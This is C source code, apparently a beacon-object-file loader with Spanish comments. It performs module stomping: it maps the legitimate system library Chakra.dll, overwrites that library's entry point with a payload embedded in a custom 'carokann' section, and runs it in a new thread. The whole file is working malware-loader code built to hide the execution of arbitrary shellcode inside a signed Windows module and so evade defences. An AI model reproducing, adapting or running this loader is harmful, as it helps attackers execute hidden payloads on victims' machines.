#include <windows.h>
#include "tcg.h"

#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

__declspec(dllimport) HANDLE  WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
__declspec(dllimport) BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
__declspec(dllimport) DWORD   WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
__declspec(dllimport) NTSTATUS NTAPI NTDLL$NtCreateSection       (PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
__declspec(dllimport) NTSTATUS NTAPI NTDLL$NtMapViewOfSection    (HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
__declspec(dllimport) NTSTATUS NTAPI NTDLL$NtUnmapViewOfSection  (HANDLE, PVOID);
__declspec(dllimport) NTSTATUS NTAPI NTDLL$NtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
__declspec(dllimport) NTSTATUS NTAPI NTDLL$NtCreateThreadEx      (PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

#define SELF ((HANDLE)(LONG_PTR)-1)

char _carokann_[0] __attribute__((section("carokann")));

// Sin 'static': CPL necesita símbolos GLOBAL para resolver CALL rel32
BOOL LoadDllFile(LPCWSTR szDllFilePath, DLLDATA *pDll) {

    HANDLE   hFile    = INVALID_HANDLE_VALUE;
    HANDLE   hSection = NULL;
    NTSTATUS STATUS   = STATUS_SUCCESS;
    PVOID    pMapped  = NULL;
    SIZE_T   sViewSize = 0;

    if (!szDllFilePath || !pDll)
        return FALSE;

    if ((hFile = KERNEL32$CreateFileW(szDllFilePath, GENERIC_READ, 0, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
        return FALSE;

    if (!NT_SUCCESS((STATUS = NTDLL$NtCreateSection(
            &hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile)))) {
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    KERNEL32$CloseHandle(hFile);

    if (!NT_SUCCESS((STATUS = NTDLL$NtMapViewOfSection(
            hSection, SELF, &pMapped, 0, 0, NULL, &sViewSize,
            1, 0, PAGE_EXECUTE_READWRITE)))) {
        KERNEL32$CloseHandle(hSection);
        return FALSE;
    }

    KERNEL32$CloseHandle(hSection);

    ParseDLL((char*)pMapped, pDll);

    if (pDll->DosHeader->e_magic != IMAGE_DOS_SIGNATURE ||
        pDll->NtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        NTDLL$NtUnmapViewOfSection(SELF, pMapped);
        return FALSE;
    }

    return TRUE;
}

BOOL VerifyInjectionSpace(DLLDATA *dll, SIZE_T sPayloadSize) {

    PIMAGE_SECTION_HEADER pImgSecHdr = NULL;
    ULONG_PTR uEntryPoint  = 0;
    ULONG_PTR uTextAddress = 0;
    SIZE_T    sTextSize    = 0;

    uEntryPoint = (ULONG_PTR)dll->DosHeader + dll->OptionalHeader->AddressOfEntryPoint;

    pImgSecHdr = IMAGE_FIRST_SECTION(dll->NtHeaders);
    for (int i = 0; i < dll->NtHeaders->FileHeader.NumberOfSections; i++) {
        // '.tex' en little-endian — evita multi-char literal warning
        if ((*(ULONG*)pImgSecHdr[i].Name | 0x20202020) == 0x7865742eUL) {
            uTextAddress = (ULONG_PTR)dll->DosHeader + pImgSecHdr[i].VirtualAddress;
            sTextSize    = pImgSecHdr[i].Misc.VirtualSize;
            break;
        }
    }

    if (!uTextAddress || !sTextSize)
        return FALSE;

    return (sTextSize - (uEntryPoint - uTextAddress)) >= sPayloadSize;
}

BOOL Stomp(LPCWSTR szDllFilePath, PBYTE pBuffer, SIZE_T sBufferSize) {

    NTSTATUS  STATUS       = STATUS_SUCCESS;
    DLLDATA   dll          = { 0 };
    ULONG_PTR uEntryPoint  = 0;
    HANDLE    hThread      = NULL;
    DWORD     dwOldProtect = 0;

    if (!szDllFilePath || !pBuffer || !sBufferSize)
        return FALSE;

    if (!LoadDllFile(szDllFilePath, &dll))
        return FALSE;

    uEntryPoint = (ULONG_PTR)dll.DosHeader + dll.OptionalHeader->AddressOfEntryPoint;

    if (!VerifyInjectionSpace(&dll, sBufferSize))
        return FALSE;

    // PVOID separado: NtProtect page-alinea BaseAddress y destruiría uEntryPoint
    PVOID  pBase = (PVOID)uEntryPoint;
    SIZE_T sSize = sBufferSize;

    // PAGE_READWRITE remueve execute de la página donde corre el código → crash
    if (!NT_SUCCESS((STATUS = NTDLL$NtProtectVirtualMemory(
            SELF, &pBase, &sSize, PAGE_READWRITE, &dwOldProtect))))
        return FALSE;

    for (SIZE_T i = 0; i < sBufferSize; i++)
        ((PBYTE)uEntryPoint)[i] = pBuffer[i];

    pBase = (PVOID)uEntryPoint;
    sSize = sBufferSize;

    if (!NT_SUCCESS((STATUS = NTDLL$NtProtectVirtualMemory(
            SELF, &pBase, &sSize, dwOldProtect, &dwOldProtect))))
        return FALSE;

    if (!NT_SUCCESS((STATUS = NTDLL$NtCreateThreadEx(
            &hThread, THREAD_ALL_ACCESS, NULL, SELF,
            (PVOID)uEntryPoint, NULL, FALSE, 0, 0, 0, NULL))))
        return FALSE;

    KERNEL32$WaitForSingleObject(hThread, INFINITE);
    KERNEL32$CloseHandle(hThread);

    return TRUE;
}

#define SACRIFICAL_DLL L"C:\\Windows\\System32\\Chakra.dll"

void go() {
    _RESOURCE *carokann     = (_RESOURCE *)&_carokann_;
    PBYTE  pInjectionAddr   = carokann->value;
    SIZE_T sInjectionLength = carokann->length;

    Stomp(SACRIFICAL_DLL, pInjectionAddr, sInjectionLength);
}